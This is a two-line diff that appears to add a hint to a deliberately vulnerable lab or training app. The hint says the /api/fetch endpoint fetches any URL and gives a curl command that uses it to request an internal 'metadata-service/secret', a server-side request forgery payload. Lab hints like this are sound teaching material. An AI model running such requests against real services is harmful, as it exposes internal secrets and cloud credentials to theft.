@@ -1,0 +1,2 @@
+💡 The /api/fetch endpoint fetches any URL. Try accessing the internal metadata-service:
+curl -X POST http://localhost:4005/api/fetch -H 'Content-Type: application/json' -d '{"url":"http://metadata-service/secret"}'
